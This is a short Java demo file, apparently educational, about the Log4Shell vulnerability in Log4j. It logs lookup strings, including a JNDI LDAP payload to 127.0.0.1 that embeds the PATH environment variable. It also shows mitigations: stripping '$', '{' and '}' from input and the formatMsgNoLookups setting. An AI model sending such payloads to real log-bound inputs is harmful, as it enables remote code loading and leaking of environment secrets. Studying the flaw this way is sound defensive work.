import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.Appender;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.appender.ConsoleAppender;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.LoggerConfig;
import org.apache.logging.log4j.core.layout.PatternLayout;

/*
import org.apache.log4j.ConsoleAppender;
import org.apache.log4j.Logger;
import org.apache.log4j.PatternLayout;
*/

public class Log4Shell {
    private static final Logger logger = LogManager.getLogger();
    //private static final Logger logger = Logger.getLogger(Log4Shell.class);

    public static void doLog(String s) {
        //logger.error(s);
        //-Dlog4j.formatMsgNoLookups=true
        //LOG4J_FORMAT_MSG_NO_LOOKUPS=true
        //logger.error(s.replaceAll("[^A-Za-z0-9]+", " "));
        logger.error(s.replaceAll("[${}]+", " "));
    }

    public static Appender createConsoleAppender() {
        PatternLayout pl = PatternLayout
                .newBuilder()
                .withPattern("%d %m%n")
                .build();
        ConsoleAppender consoleAppender = ConsoleAppender
                .newBuilder()
                .setName("My Logger")
                .setLayout(pl)
                .build();
        consoleAppender.start();
        return consoleAppender;
    }

    public static void main(String[] args) {
        /*
        ConsoleAppender consoleAppender = new ConsoleAppender();
        consoleAppender.setThreshold(Level.INFO);
        consoleAppender.setLayout(new PatternLayout("%d [%p|%c|%C{1}] %m%n"));
        consoleAppender.activateOptions();
        Logger.getRootLogger().addAppender(consoleAppender);
         */

        org.apache.logging.log4j.core.Logger coreLogger = (org.apache.logging.log4j.core.Logger)logger;
        coreLogger.addAppender(createConsoleAppender());
        //coreLogger.addAppender(new MyAppender());

/*
        logger.error("Test ${java:vm}");
        logger.error("Test ${env:PATH}");
        logger.error("Test ${jndi:ldap://127.0.0.1:8888/${env:PATH}}");
 */
        doLog("Test ${java:vm}");
        doLog("Test ${env:PATH}");
        doLog("Test ${jndi:ldap://127.0.0.1:8888/${env:PATH}}");
    }
}
